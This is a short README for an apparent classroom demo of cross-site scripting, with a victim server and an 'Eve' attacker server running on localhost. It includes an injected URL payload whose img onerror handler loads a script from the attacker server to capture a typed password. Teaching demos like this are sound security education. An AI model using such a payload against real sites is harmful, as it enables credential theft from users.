# XSS example for Security 2

Extremely simple example of an XSS attack. This case is used to see security analysis and protocols working in practice. 

### Installing and Running

Install with npm
```
npm install
```

Start two servers: the server hosting the page and a malicious server.
```
node server/server.js
node attacker/eve.js
```

Then open a browser, navigate to the webpage on ```localhost:3000?name=John``` and see the name John displayed. Then try visiting
```
localhost:3000?name=</p><img src="x" onerror="$.getScript('http://localhost:4000/malicious.js')"><p>
```
and type in your password. Eve will be listening!
